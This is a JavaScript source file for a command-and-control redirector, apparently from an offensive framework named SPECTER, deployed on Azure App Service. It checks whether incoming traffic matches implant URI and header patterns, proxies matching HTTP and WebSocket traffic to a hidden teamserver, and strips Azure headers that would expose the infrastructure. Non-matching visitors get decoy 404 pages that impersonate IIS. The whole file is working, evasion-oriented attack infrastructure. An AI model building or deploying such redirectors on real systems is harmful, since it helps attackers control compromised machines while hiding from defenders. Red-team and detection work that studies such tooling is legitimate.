/**
 * SPECTER C2 Azure App Service Redirector — WebSocket + HTTP Proxy
 *
 * Filters incoming traffic against C2 profile patterns (URI + header).
 * Matching requests are proxied to the backend teamserver with full
 * header preservation and Azure-header stripping. Non-matching requests
 * receive a decoy response to blend into normal web traffic.
 */

'use strict';

const http = require('http');
const { createProxyMiddleware } = require('http-proxy-middleware');

// ── Configuration from environment ──────────────────────────────────────────

const PORT           = process.env.PORT || 8080;
const BACKEND_URL    = process.env.BACKEND_URL;
const URI_PATTERN    = process.env.URI_PATTERN || '^/api/v[0-9]+/';
const HEADER_NAME    = (process.env.HEADER_NAME || 'X-Request-ID').toLowerCase();
const HEADER_PATTERN = process.env.HEADER_PATTERN || '^[a-f0-9]{32}$';
const DECOY_BODY     = process.env.DECOY_RESPONSE ||
  '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1>' +
  '<p>The requested URL was not found on this server.</p></body></html>';

if (!BACKEND_URL) {
  process.stderr.write('FATAL: BACKEND_URL environment variable is not set\n');
  process.exit(1);
}

const uriRegex = new RegExp(URI_PATTERN);
const hdrRegex = new RegExp(HEADER_PATTERN);

// ── Headers to strip ────────────────────────────────────────────────────────

// Azure-injected headers that leak infrastructure details
const STRIP_REQUEST_HEADERS = [
  'x-forwarded-for',
  'x-forwarded-proto',
  'x-forwarded-port',
  'x-original-url',
  'x-waws-unencoded-url',
  'x-arr-log-id',
  'x-arr-ssl',
  'x-azure-clientip',
  'x-azure-fdid',
  'x-azure-ref',
  'x-azure-requestchain',
  'x-azure-socketip',
  'disguised-host',
  'x-site-deployment-id',
  'was-default-hostname',
  'x-client-ip',
  'x-client-port',
];

const STRIP_RESPONSE_HEADERS = [
  'x-powered-by',
  'x-aspnet-version',
  'x-azure-ref',
  'x-azure-requestchain',
  'x-ms-request-id',
  'server',
];

// ── Traffic validation ──────────────────────────────────────────────────────

function isImplantTraffic(req) {
  // Check URI pattern
  const url = req.url || '/';
  if (!uriRegex.test(url)) {
    return false;
  }

  // Check required header
  const hdrValue = req.headers[HEADER_NAME];
  if (!hdrValue || !hdrRegex.test(hdrValue)) {
    return false;
  }

  return true;
}

// ── Decoy response ──────────────────────────────────────────────────────────

function sendDecoy(res) {
  res.writeHead(404, {
    'Content-Type': 'text/html; charset=utf-8',
    'Content-Length': Buffer.byteLength(DECOY_BODY),
    'Server': 'Microsoft-IIS/10.0',
    'X-Powered-By': 'ASP.NET',
    'Cache-Control': 'no-store',
    'Connection': 'close',
  });
  res.end(DECOY_BODY);
}

// ── Proxy setup ─────────────────────────────────────────────────────────────

const proxy = createProxyMiddleware({
  target: BACKEND_URL,
  changeOrigin: false,   // preserve original Host header for backend
  ws: true,
  followRedirects: true,

  // Extended timeouts for persistent WebSocket connections
  timeout: 300000,
  proxyTimeout: 300000,

  // Strip Azure headers from outgoing proxy requests
  onProxyReq: (proxyReq, req, _res) => {
    for (const hdr of STRIP_REQUEST_HEADERS) {
      proxyReq.removeHeader(hdr);
    }
  },

  // Strip infrastructure headers from backend responses
  onProxyRes: (proxyRes, _req, _res) => {
    for (const hdr of STRIP_RESPONSE_HEADERS) {
      delete proxyRes.headers[hdr];
    }
  },

  onError: (err, _req, res) => {
    process.stderr.write(`proxy error: ${err.message}\n`);
    // Return decoy on backend failure to avoid exposing infrastructure
    if (res && typeof res.writeHead === 'function') {
      sendDecoy(res);
    }
  },
});

// ── HTTP server ─────────────────────────────────────────────────────────────

const server = http.createServer((req, res) => {
  if (!isImplantTraffic(req)) {
    sendDecoy(res);
    return;
  }

  // Proxy matching traffic to backend
  proxy(req, res);
});

// ── WebSocket upgrade handler ───────────────────────────────────────────────

server.on('upgrade', (req, socket, head) => {
  if (!isImplantTraffic(req)) {
    // Reject non-matching WebSocket upgrades silently
    socket.write(
      'HTTP/1.1 404 Not Found\r\n' +
      'Server: Microsoft-IIS/10.0\r\n' +
      'Connection: close\r\n' +
      '\r\n'
    );
    socket.destroy();
    return;
  }

  // Strip Azure headers before proxying WebSocket
  for (const hdr of STRIP_REQUEST_HEADERS) {
    delete req.headers[hdr];
  }

  proxy.upgrade(req, socket, head);
});

// ── Start ───────────────────────────────────────────────────────────────────

server.listen(PORT, () => {
  // Minimal startup log (stderr only)
  process.stderr.write(`listening on :${PORT}\n`);
});

// ── Graceful shutdown ───────────────────────────────────────────────────────

process.on('SIGTERM', () => {
  server.close(() => {
    process.exit(0);
  });
  // Force exit after 10s if connections don't drain
  setTimeout(() => process.exit(0), 10000).unref();
});
